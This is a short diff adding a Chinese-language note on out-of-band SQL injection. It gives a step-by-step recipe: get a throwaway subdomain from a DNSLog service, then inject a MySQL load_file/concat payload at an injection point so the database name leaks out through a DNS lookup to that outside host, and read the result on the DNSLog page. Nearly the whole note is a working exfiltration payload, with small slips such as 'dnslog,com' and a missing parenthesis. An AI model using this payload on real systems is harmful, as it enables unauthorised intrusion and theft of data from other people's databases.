@@ -1,0 +1,4 @@
+在网址dnslog,com中获取一个假域名
+例如hq00ej.dnslog.cn
+在sql注入点使用语句 select load_file(concat("\\\\",(select database),".hq00ej.dnslog.cn\\abcd.txt")) 
+在dnslog,com刷新即可看见数据库名称
